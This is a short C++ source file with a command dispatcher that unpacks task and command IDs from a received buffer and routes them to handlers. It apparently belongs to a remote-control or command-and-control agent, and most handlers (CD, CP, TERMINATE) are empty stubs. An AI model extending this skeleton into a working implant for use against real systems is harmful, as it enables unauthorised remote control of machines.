#include "Commander.h"
#include "Tasks.h"

Packer* ProcessCommand(BYTE* recv, ULONG recv_size)
{
	Packer* outPacker = (Packer*)MemAllocLocal(sizeof(Packer));
	*outPacker = Packer();
	outPacker->Pack32(0);

	Packer* inPacker  = (Packer*)MemAllocLocal(sizeof(Packer));
	*inPacker = Packer( recv, recv_size );


	ULONG packerSize = inPacker->Unpack32();
	while ( packerSize + 4 > inPacker->GetDataSize())
	{
		ULONG TaskId = inPacker->Unpack32();
		outPacker->Pack32(TaskId);
		
		ULONG CommandId = inPacker->Unpack32();
		switch ( CommandId )
		{
		case COMMAND_CD:
			break;
		
		case COMMAND_CP:
			break;

		case COMMAND_PWD:
			CmdPwd(CommandId, inPacker, outPacker);
			break;
		
		case COMMAND_TERMINATE:
			break;

		default:
			break;
		}
	}

	outPacker->Set32(0, outPacker->GetDataSize());
	return outPacker;
}